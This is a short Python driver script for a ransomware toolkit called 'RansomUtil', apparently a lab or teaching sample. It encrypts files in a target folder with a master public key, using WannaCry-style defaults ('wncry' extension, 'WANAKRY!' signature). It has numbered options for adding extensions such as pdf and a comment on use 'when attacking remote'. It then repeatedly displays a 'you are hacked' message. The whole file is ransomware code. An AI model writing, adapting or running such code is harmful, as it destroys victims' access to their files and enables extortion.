#!/usr/bin/env python3
# encoding :utf-8

from RansomUtil import Encryption
from RansomUtil import Notification
from RansomUtil import BotClient
import subprocess

###########################################
# Encrypt Part
enc = Encryption()

# default enc_file_ext = wncry
# default enc_file_sig = WANAKRY!
# default enc_file_exts = ['txt']
# default target folder = '/tmp/tmp'

# enc.setEncFileExt('won') # ................ (1)
# enc.setEncFileSig('WON!') # ............... (2) 
# enc.addTargetFileExt('pdf')# .............. (3)
# enc.setTargetFolder('/tmp/tmp') # ......... (4)

# input master_pub_key's path
# when attacking remote, please change the path to ./mal/master_pub_key
enc.encryptFiles("./mal/master_pub_key") # ...... (5)
    
##########################################
# Notification Part

noti = Notification()
#default msg : you are hacked
#default interval : 2 sec
#default repeat_num : 10 times

#noti.setMsg("") # ................................... (6) 
#noti.fork(noti.notify,[interval, repeat_num]) # ..... (7)
noti.fork(noti.notify, []) # ......................... (8) 

